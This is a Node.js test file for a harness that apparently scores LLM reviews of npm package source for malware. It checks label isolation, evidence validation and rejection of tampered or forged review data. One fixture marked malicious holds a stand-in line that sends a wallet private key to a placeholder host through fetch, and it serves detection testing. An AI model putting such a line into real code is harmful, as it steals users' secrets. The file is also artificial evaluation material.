import assert from 'node:assert/strict';
import { test } from 'node:test';
import { gzipSync } from 'node:zlib';
import { mkdtemp, readFile, writeFile, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { prepareSourceEvaluation, compareSourceEvaluation, supplementSourceEvaluation } from './evaluate-source-llm.mjs';
import { sha256 } from './llm-source/evaluation-io.mjs';

function tarball(name, text) {
  const data = Buffer.from(text), header = Buffer.alloc(512);
  header.write(name); header.write('0000644\0', 100); header.write('0000000\0', 108); header.write('0000000\0', 116);
  header.write(data.length.toString(8).padStart(11, '0') + '\0', 124); header.write('00000000000\0', 136);
  header.fill(32, 148, 156); header[156] = 48;
  const checksum = header.reduce((sum, byte) => sum + byte, 0);
  header.write(checksum.toString(8).padStart(6, '0') + '\0 ', 148);
  return gzipSync(Buffer.concat([header, data, Buffer.alloc((512 - data.length % 512) % 512), Buffer.alloc(1024)]));
}

test('source experiment isolates labels, validates reviews and preserves abstentions', async t => {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'npm-safe-source-experiment-'));
  t.after(() => rm(directory, { recursive: true, force: true }));
  const samples = [];
  for (const [id, label, source] of [['ordinary', 'benign', 'module.exports = 42;'], ['constructed', 'malicious', "fetch('https://example.invalid', {body: wallet.privateKey});"], ['unreadable', 'malicious', 'invalid archive fixture']]) {
    const manifest = Buffer.from(JSON.stringify({ name: id, version: '1.0.0', main: 'index.js' }));
    const artifacts = {};
    for (const [kind, extension, bytes] of [['manifest', 'json', manifest], ['readme', 'txt', Buffer.from('Fixture')], ['tarball', 'tgz', id === 'unreadable' ? Buffer.from(source) : tarball('package/index.js', source)]]) {
      const name = `${id}.${extension}`;
      await writeFile(path.join(directory, name), bytes);
      artifacts[kind] = { path: name, sha256: sha256(bytes) };
    }
    samples.push({ id, name:id, version:'1.0.0', label, family:id, split:'test', provenance:{sourceUrl:'https://example.invalid/fixture',labelEvidence:'Inert constructed fixture',capturedAt:new Date().toISOString()},artifacts });
  }
  const dataset = path.join(directory, 'dataset.json'), runDirectory = path.join(directory, 'run');
  await writeFile(dataset, JSON.stringify({schemaVersion:1,id:'inert-source-prototype',kind:'synthetic',samples}));
  const prepared = await prepareSourceEvaluation(dataset, runDirectory);
  assert.equal(prepared.cases.length, 3);
  const privateRun = JSON.parse(await readFile(path.join(runDirectory, 'private-run.json')));
  for (const entry of privateRun.cases) {
    if (entry.sampleId === 'unreadable') { assert.equal(entry.status, 'failed'); continue; }
    const bundle = JSON.parse(await readFile(path.join(runDirectory, 'cases', `${entry.caseId}.json`)));
    assert.equal(bundle.label, undefined);
    assert.equal(bundle.sampleId, undefined);
    assert.equal(bundle.manifestContext?.name, undefined);
    assert.equal(bundle.manifestContext?.version, undefined);
    const file = bundle.files.find(file => file.path.endsWith('index.js')), excerpt = file.excerpts[0];
    const review = {schemaVersion:1,caseId:entry.caseId,verdict:entry.label==='malicious'?'malicious':'benign',confidence:0.7,summary:'Constructed validator fixture, not an actual model judgment.',findings:[],limitations:['Synthetic evidence-validation test.']};
    if (entry.label === 'malicious') review.findings.push({kind:'fixture',severity:'high',claim:'Constructed source sends private material.',reasoning:'Fixture verifies quoted source positions only.',evidence:[{path:file.path,startOffset:excerpt.startOffset,endOffset:excerpt.startOffset+16,quote:excerpt.text.slice(0,16)}]});
    await writeFile(path.join(runDirectory, 'reviews', `${entry.caseId}.json`), JSON.stringify(review));
  }
  const comparison = await compareSourceEvaluation(runDirectory, path.join(directory, 'comparison.json'));
  assert.equal(comparison.summary.model.tp, 1);
  assert.equal(comparison.summary.model.tn, 1);
  assert.equal(comparison.summary.model.abstainedMalicious, 1);
  const target = privateRun.cases.find(entry => entry.sampleId === 'constructed');
  await writeFile(path.join(runDirectory, 'reviews', `${target.caseId}.json`), '{invalid-json');
  const failed = await compareSourceEvaluation(runDirectory, path.join(directory, 'failed.json'));
  assert.equal(failed.summary.model.abstainedMalicious, 2);
  assert.equal(failed.summary.model.fn, 0);
  const packetPath = path.join(runDirectory, 'cases', `${target.caseId}.json`), originalPacket = await readFile(packetPath);
  await writeFile(packetPath, '{}');
  const tampered = await compareSourceEvaluation(runDirectory, path.join(directory, 'tampered.json'));
  assert.match(tampered.rows.find(row => row.caseId === target.caseId).model.error, /packet changed/);
  await writeFile(packetPath, originalPacket);
  await writeFile(path.join(runDirectory, 'reviews', `${target.caseId}.json`), Buffer.alloc(256 * 1024 + 1, 32));
  const oversized = await compareSourceEvaluation(runDirectory, path.join(directory, 'oversized.json'));
  assert.match(oversized.rows.find(row => row.caseId === target.caseId).model.error, /budget/);
  privateRun.cases[0].label = privateRun.cases[0].label === 'benign' ? 'malicious' : 'benign';
  await writeFile(path.join(runDirectory, 'private-run.json'), JSON.stringify(privateRun));
  await assert.rejects(compareSourceEvaluation(runDirectory, path.join(directory, 'changed-labels.json')), /receipt mismatch/);
});

test('one-shot supplements use original source, preserve pending failures and reject forged evidence', async t => {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'npm-safe-source-round-'));
  t.after(() => rm(directory, { recursive: true, force: true }));
  const text = Array.from({length:1500},(_,i)=>`// inert fixture line ${i}\n`).join('');
  const samples = [];
  for (const id of ['success','oversized']) {
    const artifacts = {};
    for (const [kind,extension,bytes] of [['manifest','json',Buffer.from(JSON.stringify({name:id,version:'1.0.0',main:'index.js'}))],['readme','txt',Buffer.from('Inert fixture')],['tarball','tgz',tarball('package/index.js',text)]]) {
      const file = `${id}.${extension}`; await writeFile(path.join(directory,file),bytes); artifacts[kind]={path:file,sha256:sha256(bytes)};
    }
    samples.push({id,name:id,version:'1.0.0',label:'benign',family:id,split:'test',provenance:{sourceUrl:'https://example.invalid/fixture',labelEvidence:'Inert test fixture',capturedAt:new Date().toISOString()},artifacts});
  }
  const dataset = path.join(directory,'dataset.json'), runDirectory = path.join(directory,'run');
  await writeFile(dataset,JSON.stringify({schemaVersion:1,id:'source-round-fixture',kind:'synthetic',samples}));
  await prepareSourceEvaluation(dataset,runDirectory);
  const run = JSON.parse(await readFile(path.join(runDirectory,'private-run.json')));
  const target = run.cases.find(x=>x.sampleId==='success'), large = run.cases.find(x=>x.sampleId==='oversized');
  for (const entry of run.cases) await writeFile(path.join(runDirectory,'reviews',entry.caseId+'.json'),JSON.stringify({schemaVersion:1,caseId:entry.caseId,verdict:'benign',confidence:.5,summary:'Inert validator fixture, not a model judgment',findings:[],limitations:[]}));
  const initial = JSON.parse(await readFile(path.join(runDirectory,'cases',target.caseId+'.json')));
  const file = initial.files.find(x=>x.path==='package/index.js');
  const end = file.excerpts[0].endOffset, next = file.excerpts[1].startOffset;
  assert.ok(next > end);
  const endOffset = Math.min(next,end+100);
  const request = {schemaVersion:1,caseId:target.caseId,requests:[{path:file.path,startOffset:end,endOffset,reason:'Need omitted fixture text'}]};
  await writeFile(path.join(runDirectory,'requests',target.caseId+'.json'),JSON.stringify(request));
  const pending = await compareSourceEvaluation(runDirectory,path.join(directory,'pending.json'));
  assert.equal(pending.rows.find(x=>x.caseId===target.caseId).model.status,'failed');
  const receipt = await supplementSourceEvaluation(runDirectory,target.caseId);
  assert.equal(receipt.status,'complete'); assert.equal(receipt.coverage.newlyCoveredChars,endOffset-end);
  const reviewPath = path.join(runDirectory,'reviews',target.caseId+'.json');
  const review = JSON.parse(await readFile(reviewPath));
  review.findings=[{kind:'fixture',severity:'low',claim:'Inert text exists',reasoning:'Validating original source ranges',evidence:[{path:file.path,startOffset:end,endOffset,quote:text.slice(end,endOffset)}]}];
  await writeFile(reviewPath,JSON.stringify(review));
  const complete = await compareSourceEvaluation(runDirectory,path.join(directory,'complete.json'));
  assert.equal(complete.rows.find(x=>x.caseId===target.caseId).model.status,'complete');
  await assert.rejects(supplementSourceEvaluation(runDirectory,target.caseId),/EEXIST/);
  // Even forging the supplement hash in its receipt cannot create source text.
  const packetPath = path.join(runDirectory,'supplements',target.caseId+'.json');
  const packet = JSON.parse(await readFile(packetPath));
  packet.files[0].excerpts[0].text='!'+packet.files[0].excerpts[0].text.slice(1);
  const forged = Buffer.from(JSON.stringify(packet)); await writeFile(packetPath,forged);
  receipt.packetSha256=sha256(forged); await writeFile(path.join(runDirectory,'supplement-receipts',target.caseId+'.json'),JSON.stringify(receipt));
  const tampered = await compareSourceEvaluation(runDirectory,path.join(directory,'forged.json'));
  assert.match(tampered.rows.find(x=>x.caseId===target.caseId).model.error,/differs from original/);
  await writeFile(path.join(runDirectory,'requests',large.caseId+'.json'),Buffer.alloc(16385,32));
  const failed = await supplementSourceEvaluation(runDirectory,large.caseId);
  assert.equal(failed.status,'failed'); assert.match(failed.error,/budget/);
  await writeFile(path.join(runDirectory,'requests',large.caseId+'.json'),JSON.stringify({...request,caseId:large.caseId}));
  await assert.rejects(supplementSourceEvaluation(runDirectory,large.caseId),/EEXIST/);
  const failures = await compareSourceEvaluation(runDirectory,path.join(directory,'failures.json'));
  assert.equal(failures.summary.model.tn,0);
  assert.equal(failures.summary.model.abstainedBenign,2);
});
